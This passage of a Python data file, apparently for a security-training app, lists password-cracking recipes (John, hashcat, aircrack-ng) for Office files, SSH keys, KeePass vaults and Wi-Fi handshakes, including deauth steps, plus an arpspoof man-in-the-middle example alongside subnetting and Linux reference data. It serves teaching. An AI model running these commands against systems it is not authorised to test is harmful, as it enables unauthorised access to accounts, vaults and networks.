⚠️ Check if file is actually encrypted!
  Modern Office files (.docx/.xlsx) are ZIPs. If you can unzip without password:
  unzip -l normal.docx
  → then it's NOT encrypted"""
            },
            {
                "title": "Password Not Found",
                "command": "john --wordlist=rockyou.txt docx_hash.txt",
                "explanation": "Wordlist exhausted, no match.",
                "output": """Loaded 1 password hash (Office [2013])
0g 0:30:12:00 DONE 0g/s 250Kp/s
Session completed

0 password hashes cracked, 1 left

⚠️ Try:
  • Larger wordlist
  • Hashcat with rules: hashcat -m 9600 -r best64.rule
  • Mask attack if you know format (e.g., Company2024)"""
            },
            {
                "title": "Legacy Format Needs oldoffice2john",
                "command": "office2john protected.doc > hash.txt",
                "explanation": "office2john handles modern formats; legacy .doc needs oldoffice2john.",
                "output": """ERROR: Not a valid Office 2007+ file (missing [Content_Types].xml)
ERROR: The file 'protected.doc' is in legacy format

⚠️ Use the correct extractor:
  Legacy .doc/.xls:  oldoffice2john protected.doc > hash.txt
  Modern .docx/.xlsx: office2john protected.docx > hash.txt"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load Document", "desc": "Reads protected.docx", "from": "Attacker", "to": "office2john", "data": "protected.docx", "color": "#2980b9"},
            {"step": 2, "title": "Extract Hash", "desc": "office2john outputs SHA512+AES hash", "from": "office2john", "to": "Hash", "data": "$office$*2013*...", "color": "#3498db"},
            {"step": 3, "title": "Crack with John", "desc": "Dictionary attack on hash", "from": "John", "to": "Hash", "data": "Try 'company2024'", "color": "#f39c12"},
            {"step": 4, "title": "Open Document", "desc": "Password found — file opens in Word", "from": "Attacker", "to": "Document", "data": "company2024 ✓", "color": "#27ae60"}
        ]
    },
    # ---------- SSH KEYS ----------
    {
        "id": "ssh_key_crack",
        "name": "SSH Private Key Cracking",
        "icon": "🔑",
        "color": "#8e44ad",
        "tagline": "Encrypted SSH Key Recovery",
        "description": "SSH private keys are often encrypted with a passphrase. ssh2john extracts the passphrase hash for offline cracking.",
        "install": "sudo apt install john ssh",
        "difficulty": "Intermediate",
        "speed": "Fast",
        "category": "File Cracking",
        "common_flags": [
            {"flag": "ssh2john", "desc": "Extract SSH key hash"},
            {"flag": "--wordlist", "desc": "Dictionary attack"},
            {"flag": "--format=ssh", "desc": "Force SSH format"}
        ],
        "examples": [
            {
                "title": "SSH Key Crack",
                "command": "ssh2john id_rsa > ssh_hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt",
                "explanation": "Extracts passphrase hash from encrypted SSH key.",
                "output": """Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH])
mypassphrase     (id_rsa)
1g 0:00:00:15 DONE"""
            },
            {
                "title": "SSH + Hashcat",
                "command": "ssh2john id_rsa > ssh_hash.txt\nhashcat -m 22931 ssh_hash.txt /usr/share/wordlists/rockyou.txt",
                "explanation": "`-m 22931` = SSH RSA/DSA/EC/OpenSSH.",
                "output": """Status...........: Cracked
Hash.Mode........: 22931 (SSH RSA/DSA/EC/OPENSSH)
Candidates.#1....: mypassphrase -> mypassphrase"""
            }
        ],
        "failures": [
            {
                "title": "SSH Key Not Encrypted",
                "command": "ssh2john id_rsa > hash.txt",
                "explanation": "The private key has no passphrase.",
                "output": """id_rsa:$sshng$1$...

0 password hashes loaded

⚠️ Key has no passphrase!
   Test: ssh-keygen -y -f id_rsa
   If this prints the public key without asking for a passphrase,
   then the key is unencrypted — no need to crack."""
            },
            {
                "title": "Passphrase Not Found",
                "command": "john --wordlist=rockyou.txt ssh_hash.txt",
                "explanation": "Passphrase isn't in the wordlist.",
                "output": """Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH])
0g 0:08:15:00 DONE 0g/s 3500Kp/s
Session completed

0 password hashes cracked, 1 left

⚠️ Try:
  • Larger wordlist
  • Hashcat with rules
  • Single mode (if you know user info)"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load Key", "desc": "Reads encrypted id_rsa", "from": "Attacker", "to": "ssh2john", "data": "id_rsa (encrypted)", "color": "#8e44ad"},
            {"step": 2, "title": "Extract Hash", "desc": "ssh2john creates crackable hash", "from": "ssh2john", "to": "Hash", "data": "$sshng$*0*...", "color": "#3498db"},
            {"step": 3, "title": "Dictionary Attack", "desc": "Try each wordlist entry", "from": "John", "to": "Hash", "data": "Try 'mypassphrase'", "color": "#f39c12"},
            {"step": 4, "title": "Key Unlocked", "desc": "Passphrase found — SSH key usable", "from": "Attacker", "to": "SSH", "data": "mypassphrase ✓", "color": "#27ae60"}
        ]
    },
    # ---------- KEEPASS ----------
    {
        "id": "keepass_crack",
        "name": "KeePass Database Cracking",
        "icon": "🔐",
        "color": "#c0392b",
        "tagline": "Password Manager Vault Recovery",
        "description": "KeePass .kdbx databases are encrypted with a master password. Weak master passwords can be recovered with brute-force tools.",
        "install": "sudo apt install john hashcat",
        "difficulty": "Intermediate",
        "speed": "Slow (strong KDF)",
        "category": "File Cracking",
        "common_flags": [
            {"flag": "keepass2john", "desc": "Extract KeePass hash"},
            {"flag": "-m 13400", "desc": "Hashcat: KeePass 1 (AES)"},
            {"flag": "-m 13400", "desc": "Hashcat: KeePass 2"}
        ],
        "examples": [
            {
                "title": "KeePass Crack with John",
                "command": "keepass2john database.kdbx > keepass_hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt",
                "explanation": "Extracts master password hash from KeePass DB.",
                "output": """Loaded 1 password hash (KeePass [AES/Twofish SHA256])
masterpass       (database)
1g 0:00:00:45 DONE"""
            }
        ],
        "failures": [
            {
                "title": "Not a Valid KeePass File",
                "command": "keepass2john file.txt > hash.txt",
                "explanation": "File isn't a KeePass database.",
                "output": """ERROR: file.txt is not a KeePass database
Missing signature: 03 D9 A2 9A 67 FB 4B B5

⚠️ Verify:
  file database.kdbx
  Look for: 'KeePass password manager database'"""
            },
            {
                "title": "Master Password Not Found",
                "command": "john --wordlist=rockyou.txt keepass_hash.txt",
                "explanation": "Master password isn't in the wordlist.",
                "output": """Loaded 1 password hash (KeePass [AES/Twofish])
0g 0:120:00:00 DONE 0g/s 500Kp/s
Session completed

0 password hashes cracked, 1 left

⚠️ KeePass uses strong KDF (AES-256 + many iterations)
   Speed is only ~500 hashes/sec even with GPU.
   Realistic for weak master passwords only.

   Try:
   • Larger wordlist (SecLists)
   • Hashcat with rules
   • Mask attack for known pattern"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load Database", "desc": "Reads .kdbx file", "from": "Attacker", "to": "keepass2john", "data": "database.kdbx", "color": "#c0392b"},
            {"step": 2, "title": "Extract Hash", "desc": "Extracts master password hash", "from": "keepass2john", "to": "Hash", "data": "$keepass$*2*...", "color": "#3498db"},
            {"step": 3, "title": "Slow KDF", "desc": "KeePass uses strong KDF — much slower", "from": "John", "to": "Hash", "data": "~500 hashes/sec", "color": "#f39c12"},
            {"step": 4, "title": "Weak Password Found", "desc": "Master 'masterpass' cracked", "from": "John", "to": "Output", "data": "masterpass ✓", "color": "#27ae60"}
        ]
    },
    # ---------- WIFI ----------
    {
        "id": "wifi_crack",
        "name": "Wi-Fi Handshake Cracking",
        "icon": "📡",
        "color": "#16a085",
        "tagline": "WPA/WPA2 PSK Recovery",
        "description": "Capture the 4-way handshake between a Wi-Fi client and AP, then crack the PSK offline with aircrack-ng or hashcat.",
        "install": "sudo apt install aircrack-ng hashcat hcxtools",
        "difficulty": "Advanced",
        "speed": "Medium (PSKDF2)",
        "category": "Network Cracking",
        "common_flags": [
            {"flag": "airmon-ng start", "desc": "Enable monitor mode"},
            {"flag": "airodump-ng", "desc": "Capture packets"},
            {"flag": "aireplay-ng --deauth", "desc": "Force handshake"},
            {"flag": "aircrack-ng -w", "desc": "Crack with wordlist"},
            {"flag": "hcxpcapngtool", "desc": "Convert .cap → .hc22000"}
        ],
        "examples": [
            {
                "title": "Full Workflow",
                "command": "# 1. Monitor mode\nsudo airmon-ng start wlan0\n\n# 2. Scan\nsudo airodump-ng mon0\n\n# 3. Lock target\nsudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture mon0\n\n# 4. Deauth\nsudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 mon0\n\n# 5. Crack\naircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap",
                "explanation": "Complete 5-step workflow: monitor → scan → capture → deauth → crack.",
                "output": """                               Aircrack-ng 1.7
      [00:00:05] 14344/14344391 keys tested (2856.32 k/s)
      KEY FOUND! [ mywifi123 ]

      Master Key     : A1 B2 C3 D4 E5 F6 78 90 AB CD EF 12 34 56 78 90"""
            },
            {
                "title": "GPU-Accelerated",
                "command": "hcxpcapngtool -o hash.hc22000 capture-01.cap\nhashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt",
                "explanation": "Convert to Hashcat format and use GPU for speed.",
                "output": """Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Candidates.#1....: mywifi123 -> mywifi123
Speed.#1.........:   120.5 kH/s"""
            }
        ],
        "failures": [
            {
                "title": "No Handshake Captured",
                "command": "aircrack-ng -w rockyou.txt capture-01.cap",
                "explanation": "Capture file doesn't contain a valid WPA handshake.",
                "output": """                               Aircrack-ng 1.7

Opening capture-01.cap
Read 4521 packets.

   #  BSSID              ESSID                     Encryption

   1  AA:BB:CC:DD:EE:FF  HomeWiFi                  WPA (0 handshake)

No networks found for cracking.

⚠️ No handshake captured!
   Fixes:
   • Wait longer (airodump-ng must catch the 4-way exchange)
   • Force a deauth: aireplay-ng --deauth 5
   • Move closer to target (stronger signal)
   • Try capturing with better antenna"""
            },
            {
                "title": "Password Not Found in Wordlist",
                "command": "aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap",
                "explanation": "Wi-Fi password isn't in rockyou.",
                "output": """                               Aircrack-ng 1.7

      [00:45:12] 14344391/14344391 keys tested (5290.14 k/s)

      KEY NOT FOUND

      Tried 14344391 keys

⚠️ Try:
  • Larger wordlist (SecLists Wi-Fi list)
  • Hashcat with rules: hashcat -m 22000 -r best64.rule
  • Mask attack for known pattern (e.g., 8 digits)
  • Some networks use WPA3 or Enterprise — different approach needed"""
            },
            {
                "title": "Monitor Mode Failed — Adapter Not Supported",
                "command": "sudo airmon-ng start wlan0",
                "explanation": "Your Wi-Fi adapter doesn't support monitor mode.",
                "output": """Found 2 processes that could cause trouble.
PHY     Interface       Driver          Chipset
phy0    wlan0           iwlwifi         Intel Corporation Wireless 8265

ERROR: wlan0 doesn't support monitor mode

⚠️ Adapter limitations:
  • Many internal cards (Intel, Broadcom) don't support monitor mode
  • Use external USB adapter: Alfa AWUS036ACH, TP-Link TL-WN722N
  • Check compatibility: https://www.aircrack-ng.org/doku.php?id=compatibility"""
            },
            {
                "title": "Deauth Attack Fails (WPA3 / PMF)",
                "command": "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF mon0",
                "explanation": "Modern networks with PMF (802.11w) ignore deauth packets.",
                "output": """14:23:45  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]
14:23:46  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]
...
[ERROR] Deauth packets are being ignored (PMF enabled)

No handshake captured.

⚠️ Network uses 802.11w (PMF/Management Frame Protection)
   Deauth attacks don't work!
   Alternatives:
   • Wait for a legitimate client to connect (may take hours)
   • PMF is WPA3-only — different attack approach needed"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Monitor Mode", "desc": "Adapter enters promiscuous mode", "from": "Attacker", "to": "wlan0", "data": "airmon-ng start", "color": "#16a085"},
            {"step": 2, "title": "Scan Networks", "desc": "airodump-ng lists nearby APs", "from": "wlan0", "to": "Air", "data": "HomeWiFi ch6", "color": "#3498db"},
            {"step": 3, "title": "Capture Handshake", "desc": "Wait for client to connect", "from": "wlan0", "to": "AP", "data": "4-way handshake", "color": "#f39c12"},
            {"step": 4, "title": "Deauth Attack", "desc": "Force client to reconnect", "from": "Attacker", "to": "Client", "data": "aireplay-ng --deauth", "color": "#e74c3c"},
            {"step": 5, "title": "Offline Crack", "desc": "Try wordlist against handshake", "from": "aircrack-ng", "to": "Wordlist", "data": "2856 keys/sec", "color": "#9b59b6"},
            {"step": 6, "title": "PSK Found", "desc": "Wi-Fi password recovered", "from": "aircrack-ng", "to": "Attacker", "data": "mywifi123 ✓", "color": "#27ae60"}
        ]
    }
]

# ==================== COMMON WORDLIST PATHS ====================
WORDLIST_PATHS = [
    {"path": "/usr/share/wordlists/rockyou.txt", "size": "133 MB", "count": "14,344,391", "best_for": "General cracking", "source": "Pre-installed on Kali"},
    {"path": "/usr/share/wordlists/rockyou.txt.gz", "size": "50 MB", "count": "14,344,391", "best_for": "Compressed", "source": "Pre-installed on Kali"},
    {"path": "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt", "size": "8 MB", "count": "1,000,000", "best_for": "Fast common", "source": "SecLists"},
    {"path": "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt", "size": "9 MB", "count": "750,000", "best_for": "Quick subset", "source": "SecLists"},
    {"path": "/usr/share/seclists/Passwords/WiFi-WPA/", "size": "Various", "count": "Various", "best_for": "WPA cracking", "source": "SecLists"},
    {"path": "/usr/share/seclists/Usernames/Names/names.txt", "size": "5 MB", "count": "~100,000", "best_for": "Username enum", "source": "SecLists"},
    {"path": "/usr/share/john/password.lst", "size": "3 MB", "count": "~3,500", "best_for": "John default", "source": "John package"},
    {"path": "/usr/share/metasploit-framework/data/wordlists/", "size": "Various", "count": "Various", "best_for": "MSF modules", "source": "Metasploit"}
]



# ==================== SUBNETTING MODULE ====================
SUBNET_BITS = [
    {"bit": 128, "position": 1},
    {"bit": 64,  "position": 2},
    {"bit": 32,  "position": 3},
    {"bit": 16,  "position": 4},
    {"bit": 8,   "position": 5},
    {"bit": 4,   "position": 6},
    {"bit": 2,   "position": 7},
    {"bit": 1,   "position": 8},
]

IP_CLASSES = [
    {"class": "A", "range": "1.0.0.0 – 126.255.255.255", "default_mask": "255.0.0.0", "cidr": "/8", "networks": "126", "hosts_per_net": "16,777,214", "first_octet_bits": "0xxxxxxx", "purpose": "Very large networks", "color": "#e74c3c"},
    {"class": "B", "range": "128.0.0.0 – 191.255.255.255", "default_mask": "255.255.0.0", "cidr": "/16", "networks": "16,384", "hosts_per_net": "65,534", "first_octet_bits": "10xxxxxx", "purpose": "Medium-large networks", "color": "#e67e22"},
    {"class": "C", "range": "192.0.0.0 – 223.255.255.255", "default_mask": "255.255.255.0", "cidr": "/24", "networks": "2,097,152", "hosts_per_net": "254", "first_octet_bits": "110xxxxx", "purpose": "Small networks", "color": "#f39c12"},
    {"class": "D", "range": "224.0.0.0 – 239.255.255.255", "default_mask": "N/A", "cidr": "N/A", "networks": "N/A", "hosts_per_net": "N/A", "first_octet_bits": "1110xxxx", "purpose": "Multicast", "color": "#27ae60"},
    {"class": "E", "range": "240.0.0.0 – 255.255.255.255", "default_mask": "N/A", "cidr": "N/A", "networks": "N/A", "hosts_per_net": "N/A", "first_octet_bits": "1111xxxx", "purpose": "Experimental / Research", "color": "#3498db"},
]

SUBNET_FORMULAS = [
    {"name": "Number of Subnets", "formula": "2^n", "explanation": "n = number of borrowed bits from host portion"},
    {"name": "Hosts per Subnet", "formula": "2^h − 2", "explanation": "h = remaining host bits. Subtract 2 for network & broadcast addresses"},
    {"name": "Block Size", "formula": "256 − (last octet of mask)", "explanation": "Determines subnet boundary spacing"},
    {"name": "Total Hosts (in subnet)", "formula": "2^h", "explanation": "Includes network & broadcast addresses"},
    {"name": "Network Address", "formula": "IP AND MASK", "explanation": "Bitwise AND of IP and subnet mask"},
    {"name": "Broadcast Address", "formula": "Network + Block Size − 1", "explanation": "Last address in the subnet"},
]

SUBNET_EXAMPLES = [
    {
        "cidr": "/24",
        "mask": "255.255.255.0",
        "binary_mask": "11111111.11111111.11111111.00000000",
        "subnets": "1",
        "hosts_per_subnet": "254",
        "block_size": "256",
        "example_ip": "192.168.1.10",
        "network": "192.168.1.0",
        "broadcast": "192.168.1.255",
        "first_host": "192.168.1.1",
        "last_host": "192.168.1.254",
        "explanation": "Standard home/office network. 256 total addresses, minus network & broadcast = 254 usable hosts.",
        "color": "#27ae60"
    },
    {
        "cidr": "/25",
        "mask": "255.255.255.128",
        "binary_mask": "11111111.11111111.11111111.10000000",
        "subnets": "2",
        "hosts_per_subnet": "126",
        "block_size": "128",
        "example_ip": "192.168.1.100",
        "network": "192.168.1.0",
        "broadcast": "192.168.1.127",
        "first_host": "192.168.1.1",
        "last_host": "192.168.1.126",
        "explanation": "Splits a /24 into TWO equal halves. Each half has 128 addresses (126 usable).",
        "color": "#3498db"
    },
    {
        "cidr": "/26",
        "mask": "255.255.255.192",
        "binary_mask": "11111111.11111111.11111111.11000000",
        "subnets": "4",
        "hosts_per_subnet": "62",
        "block_size": "64",
        "example_ip": "192.168.1.150",
        "network": "192.168.1.128",
        "broadcast": "192.168.1.191",
        "first_host": "192.168.1.129",
        "last_host": "192.168.1.190",
        "explanation": "4 subnets of 64 addresses each (62 usable). Great for departmental segregation.",
        "color": "#f39c12"
    },
    {
        "cidr": "/27",
        "mask": "255.255.255.224",
        "binary_mask": "11111111.11111111.11111111.11100000",
        "subnets": "8",
        "hosts_per_subnet": "30",
        "block_size": "32",
        "example_ip": "192.168.1.70",
        "network": "192.168.1.64",
        "broadcast": "192.168.1.95",
        "first_host": "192.168.1.65",
        "last_host": "192.168.1.94",
        "explanation": "8 subnets × 30 hosts. Useful for small departments or point-to-multipoint links.",
        "color": "#e67e22"
    },
    {
        "cidr": "/28",
        "mask": "255.255.255.240",
        "binary_mask": "11111111.11111111.11111111.11110000",
        "subnets": "16",
        "hosts_per_subnet": "14",
        "block_size": "16",
        "example_ip": "192.168.1.20",
        "network": "192.168.1.16",
        "broadcast": "192.168.1.31",
        "first_host": "192.168.1.17",
        "last_host": "192.168.1.30",
        "explanation": "16 subnets × 14 hosts. Common for small VLANs or server farm segments.",
        "color": "#9b59b6"
    },
    {
        "cidr": "/30",
        "mask": "255.255.255.252",
        "binary_mask": "11111111.11111111.11111111.11111100",
        "subnets": "64",
        "hosts_per_subnet": "2",
        "block_size": "4",
        "example_ip": "10.0.0.2",
        "network": "10.0.0.0",
        "broadcast": "10.0.0.3",
        "first_host": "10.0.0.1",
        "last_host": "10.0.0.2",
        "explanation": "Perfect for point-to-point router links. Only 2 usable addresses.",
        "color": "#c0392b"
    },
]

# ==================== ARP MODULE ====================
ARP_STEPS = [
    {
        "step": 1,
        "title": "You ping a device on your LAN",
        "command": "ping 192.168.1.20",
        "description": "Before sending the ping, your computer needs to know the MAC address of 192.168.1.20. It checks its ARP cache first.",
        "from": "Your PC (192.168.1.10)",
        "to": "Target (192.168.1.20)",
        "data": "Need MAC for 192.168.1.20",
        "color": "#3498db"
    },
    {
        "step": 2,
        "title": "ARP cache is empty — broadcast ARP request",
        "command": "arp -n (before)",
        "description": "The ARP table is empty for this IP, so your PC broadcasts an ARP request to every device on the LAN: 'Who has 192.168.1.20? Tell 192.168.1.10'.",
        "from": "Your PC (broadcast FF:FF:FF:FF:FF:FF)",
        "to": "All devices on LAN",
        "data": "Who has 192.168.1.20?",
        "color": "#f39c12"
    },
    {
        "step": 3,
        "title": "Target replies with its MAC",
        "command": "ARP Reply",
        "description": "Only 192.168.1.20 responds: 'I have 192.168.1.20. My MAC is AA:BB:CC:11:22:33'. All other devices ignore the request.",
        "from": "Target (192.168.1.20)",
        "to": "Your PC (192.168.1.10)",
        "data": "192.168.1.20 is at AA:BB:CC:11:22:33",
        "color": "#27ae60"
    },
    {
        "step": 4,
        "title": "ARP cache is updated",
        "command": "arp -n (after)",
        "description": "Your PC now has an entry: 192.168.1.20 → AA:BB:CC:11:22:33. The ping packet can be delivered.",
        "from": "Your PC",
        "to": "ARP Table",
        "data": "192.168.1.20 → AA:BB:CC:11:22:33",
        "color": "#9b59b6"
    },
    {
        "step": 5,
        "title": "Entry expires after ~2 minutes",
        "command": "arp -n (5 min later)",
        "description": "ARP entries are cached temporarily (typically 60–300 seconds). After expiry, the next ping triggers a new ARP request.",
        "from": "ARP Table",
        "to": "Expired",
        "data": "Entry removed (timeout)",
        "color": "#e74c3c"
    }
]

ARP_TABLE_EXAMPLE = [
    {"ip": "192.168.1.1",  "mac": "00:1A:2B:3C:4D:5E", "type": "dynamic", "iface": "eth0"},
    {"ip": "192.168.1.5",  "mac": "AA:BB:CC:11:22:33", "type": "dynamic", "iface": "eth0"},
    {"ip": "192.168.1.20", "mac": "DE:AD:BE:EF:00:01", "type": "dynamic", "iface": "eth0"},
    {"ip": "192.168.1.50", "mac": "12:34:56:78:9A:BC", "type": "dynamic", "iface": "eth0"},
    {"ip": "192.168.1.100","mac": "FE:DC:BA:98:76:54", "type": "static",  "iface": "eth0"},
]

ARP_COMMANDS = [
    {"command": "arp -n", "description": "Show ARP table (numeric — no DNS lookup)", "output": """Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.1.1              ether   00:1A:2B:3C:4D:5E   C                     eth0
192.168.1.5              ether   AA:BB:CC:11:22:33   C                     eth0
192.168.1.20             ether   DE:AD:BE:EF:00:01   C                     eth0
192.168.1.50             ether   12:34:56:78:9A:BC   C                     eth0
192.168.1.100            ether   FE:DC:BA:98:76:54   CM                    eth0"""},
    {"command": "arp -a", "description": "Show ARP table with hostnames (if resolvable)", "output": """gateway (192.168.1.1) at 00:1A:2B:3C:4D:5E [ether] on eth0
? (192.168.1.5) at AA:BB:CC:11:22:33 [ether] on eth0
? (192.168.1.20) at DE:AD:BE:EF:00:01 [ether] on eth0"""},
    {"command": "ip neigh show", "description": "Modern alternative to arp -n", "output": """192.168.1.1 dev eth0 lladdr 00:1A:2B:3C:4D:5E REACHABLE
192.168.1.5 dev eth0 lladdr AA:BB:CC:11:22:33 STALE
192.168.1.20 dev eth0 lladdr DE:AD:BE:EF:00:01 REACHABLE"""},
    {"command": "sudo arp -s 192.168.1.100 FE:DC:BA:98:76:54", "description": "Manually add a STATIC ARP entry (spoofing risk!)", "output": """[sudo] password for user:
ARP entry added: 192.168.1.100 → FE:DC:BA:98:76:54 (PERMANENT)"""},
    {"command": "sudo arp -d 192.168.1.100", "description": "Delete an ARP entry", "output": """ARP entry deleted: 192.168.1.100"""},
    {"command": "sudo arp -i eth0 -s 192.168.1.100 FE:DC:BA:98:76:54", "description": "Add static ARP bound to specific interface", "output": """Static ARP entry added on interface eth0"""},
]

ARP_FPING_EXAMPLE = """$ fping -a -g 192.168.1.0/24 2>/dev/null
192.168.1.1
192.168.1.5
192.168.1.10
192.168.1.20
192.168.1.50
192.168.1.100
192.168.1.105

$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.1.1              ether   00:1A:2B:3C:4D:5E   C                     eth0
192.168.1.5              ether   AA:BB:CC:11:22:33   C                     eth0
192.168.1.10             ether   3C:22:FB:AA:BB:CC   C                     eth0
192.168.1.20             ether   DE:AD:BE:EF:00:01   C                     eth0
192.168.1.50             ether   12:34:56:78:9A:BC   C                     eth0
192.168.1.100            ether   FE:DC:BA:98:76:54   C                     eth0
192.168.1.105            ether   4A:5B:6C:7D:8E:9F   C                     eth0"""

ARP_SPOOF_STEPS = [
    {
        "step": 1,
        "title": "Legitimate ARP table",
        "description": "Before the attack. Router (192.168.1.1) has MAC 00:1A:2B:3C:4D:5E. Victim trusts this.",
        "command": "arp -n (before)",
        "data": "192.168.1.1 → 00:1A:2B:3C:4D:5E",
        "from": "Legitimate",
        "to": "Victim Table",
        "color": "#27ae60"
    },
    {
        "step": 2,
        "title": "Attacker floods fake ARP reply",
        "description": "Attacker (192.168.1.99) sends unsolicited ARP replies: 'I am 192.168.1.1, my MAC is 66:66:66:66:66:66'.",
        "command": "arpspoof -i eth0 -t 192.168.1.10 192.168.1.1",
        "data": "192.168.1.1 is at 66:66:66:66:66:66 (FAKE)",
        "from": "Attacker (192.168.1.99)",
        "to": "Victim (192.168.1.10)",
        "color": "#e74c3c"
    },
    {
        "step": 3,
        "title": "Victim's ARP table is overwritten",
        "description": "The victim accepts the fake reply (ARP has no authentication) and updates its table.",
        "command": "arp -n (after)",
        "data": "192.168.1.1 → 66:66:66:66:66:66 (ATTACKER)",
        "from": "Fake Reply",
        "to": "Victim Table",
        "color": "#c0392b"
    },
    {
        "step": 4,
        "title": "All traffic goes through attacker",
        "description": "Now any traffic from the victim to the 'router' actually goes to the attacker. Man-in-the-middle achieved!",
        "command": "tcpdump -i eth0 host 192.168.1.10",
        "data": "Victim's packets → Attacker → Real Router",
        "from": "Victim",
        "to": "Internet (via attacker)",
        "color": "#9b59b6"
    },
    {
        "step": 5,
        "title": "Detection & Defense",
        "description": "Detect: `arpwatch`, `arp -n` showing duplicate MACs. Defend: Static ARP entries, Dynamic ARP Inspection (DAI), 802.1X.",
        "command": "arpwatch -i eth0",
        "data": "Warning: 192.168.1.1 MAC changed!",
        "from": "Monitor",
        "to": "Admin Alert",
        "color": "#f39c12"
    }
]

MANUAL_IP_CONFIG = {
    "windows": [
        "Open Network and Sharing Center",
        "Change adapter settings",
        "Right-click adapter → Properties",
        "Select 'Internet Protocol Version 4 (TCP/IPv4)'",
        "Click Properties",
        "Choose 'Use the following IP address:'",
        "Enter: IP address, Subnet mask, Default gateway",
        "Enter DNS servers (e.g., 8.8.8.8, 8.8.4.4)",
        "Click OK"
    ],
    "linux": [
        "sudo ip addr add 192.168.1.50/24 dev eth0",
        "sudo ip link set eth0 up",
        "sudo ip route add default via 192.168.1.1",
        "echo 'nameserver 8.8.8.8' | sudo tee /etc/resolv.conf",
        "",
        "# Or permanently via nmcli:",
        "sudo nmcli con mod eth0 ipv4.addresses 192.168.1.50/24",
        "sudo nmcli con mod eth0 ipv4.gateway 192.168.1.1",
        "sudo nmcli con mod eth0 ipv4.dns 8.8.8.8",
        "sudo nmcli con mod eth0 ipv4.method manual",
        "sudo nmcli con up eth0"
    ],
    "macos": [
        "System Preferences → Network",
        "Select your network interface",
        "Click Advanced → TCP/IP",
        "Configure IPv4: Manually",
        "Enter: IP Address, Subnet Mask, Router",
        "Click DNS tab → add DNS servers",
        "Click OK → Apply"
    ]
}

# ==================== LINUX MODULE DATA ====================

LINUX_INTRO = {
    "what": "Linux is a free, open-source Unix-like operating system kernel created by Linus Torvalds in 1991. It powers servers, smartphones (Android), supercomputers, cloud infrastructure, and embedded devices worldwide.",
    "why": [
        "Open source — anyone can view, modify, and distribute the code",
        "Stable and secure — powers 96% of the top 1 million web servers",
        "Multi-user — many users can work simultaneously on the same system",
        "Multitasking — runs many processes at once",
        "Portable — runs on almost any hardware architecture",
        "Free — no licensing costs"
    ],
    "distributions": [
        {"name": "Ubuntu", "use": "Beginner-friendly desktop & server", "pkg": "apt", "color": "#e95420"},
        {"name": "Debian", "use": "Stability-focused server", "pkg": "apt", "color": "#d70a53"},
        {"name": "Red Hat / RHEL", "use": "Enterprise server", "pkg": "dnf/yum", "color": "#ee0000"},
        {"name": "Fedora", "use": "Cutting-edge features", "pkg": "dnf", "color": "#294172"},
        {"name": "CentOS", "use": "Free RHEL clone", "pkg": "dnf/yum", "color": "#262577"},
        {"name": "Arch Linux", "use": "DIY, rolling release", "pkg": "pacman", "color": "#1793d1"},
        {"name": "Kali Linux", "use": "Penetration testing", "pkg": "apt", "color": "#557c94"},
        {"name": "Alpine", "use": "Tiny containers", "pkg": "apk", "color": "#0d597f"}
    ],
    "architecture": [
        {"layer": "User Applications", "desc": "Web browsers, editors, custom scripts", "color": "#e74c3c"},
        {"layer": "Shell", "desc": "Command interpreter (bash, zsh, sh)", "color": "#e67e22"},
        {"layer": "System Libraries", "desc": "glibc, libc, standard C library", "color": "#f39c12"},
        {"layer": "System Calls", "desc": "Interface between user and kernel", "color": "#27ae60"},
        {"layer": "Kernel", "desc": "Core: process, memory, filesystem, network", "color": "#3498db"},
        {"layer": "Hardware", "desc": "CPU, RAM, disks, network cards", "color": "#9b59b6"}
    ]
}

# ==================== LINUX: FILESYSTEM (with modal data) ====================
LINUX_FILESYSTEM = [
    {
        "path": "/", "name": "Root", "icon": "🌳", "color": "#e74c3c",
        "description": "The top-level directory. Everything starts here. Do not confuse with /root (the root user's home).",
        "contains": ["All other directories"],
        "importance": "If this is missing or corrupted, the system can't boot.",
        "output": """$ ls /
bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var""",
        "explanation": "The root directory contains the entire filesystem tree. Every absolute path starts here. The Linux filesystem hierarchy is defined by the FHS (Filesystem Hierarchy Standard).",
        "simulation": [
            {"step": 1, "title": "Kernel mounts root", "desc": "Kernel reads /etc/fstab and mounts / at boot", "from": "Kernel", "to": "Disk", "data": "mount /", "color": "#e74c3c"},
            {"step": 2, "title": "Root becomes tree base", "desc": "All other mounts stack beneath /", "from": "Kernel", "to": "/", "data": "Root mounted", "color": "#f39c12"},
            {"step": 3, "title": "Subdirs accessible", "desc": "Users can cd into /home, /etc, /var", "from": "Shell", "to": "/", "data": "cd /home", "color": "#27ae60"}
        ]
    },
    {
        "path": "/bin", "name": "Binary Commands", "icon": "⚙️", "color": "#3498db",
        "description": "Essential user binaries needed for single-user mode (ls, cp, mv, cat, bash).",
        "contains": ["ls", "cp", "mv", "cat", "bash", "echo"],
        "importance": "Without /bin, no basic commands work. System unusable.",
        "output": """$ ls /bin
bash  cat  chmod  cp  echo  grep  kill  ln  ls  mkdir  mv  pwd  rm  sh  touch""",
        "explanation": "On modern systems, /bin is a symlink to /usr/bin. Historically it held essential binaries needed to boot and repair the system before /usr was mounted.",
        "simulation": [
